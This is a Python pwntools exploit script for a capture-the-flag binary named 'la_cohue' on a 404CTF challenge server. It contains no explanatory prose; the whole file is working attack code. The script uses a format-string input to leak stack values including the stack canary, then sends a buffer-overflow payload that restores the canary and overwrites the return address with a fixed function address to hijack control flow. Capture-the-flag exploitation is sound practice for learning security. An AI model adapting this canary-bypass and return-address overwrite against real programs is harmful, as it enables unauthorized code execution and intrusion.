#!/usr/bin/env python3

from pwn import *
from time import sleep
from binascii import unhexlify


HOST = "challenges.404ctf.fr"
PORT = 30223

exe = ELF("./la_cohue")

context.binary = exe.path


def conn():
    if args.REMOTE:
        r = remote(HOST, PORT)
    elif args.TRACE:
        r  = process(["strace", "-o","strace.out", exe.path])
    else:
        r = process([exe.path])
    return r

def main():
    global r
    r = conn()

    canary_fnct_add = 0x00400877

    rep = r.recvuntil(b'>>> ')
    r.send(b'2\n')
    # r.recvuntil(b'[Vous] : ')
    r.send(b'A'*8 + b'.%16$p.%17$p.%18$p.%19$p' + b'\n')
    rep = r.recvuntil(b'>>> ')

    save1 = int(rep.split(b'.')[1],16)
    canary = int(rep.split(b'.')[2],16)
    save2 = int(rep.split(b'.')[3],16)

    payload = b''
    payload += b'A' * 0x40
    payload += p64(save1) + p64(canary) + p64(save2) + p64(canary_fnct_add)


    r.send(b'1\n')
    r.recvuntil(b'[Vous] : ')
    r.send(payload + b'\n')

    rep = r.recv()
    r.send(b'3\n')
    rep = r.recv()
    rep = r.recv()

    print(rep)


if __name__ == "__main__":
	main()
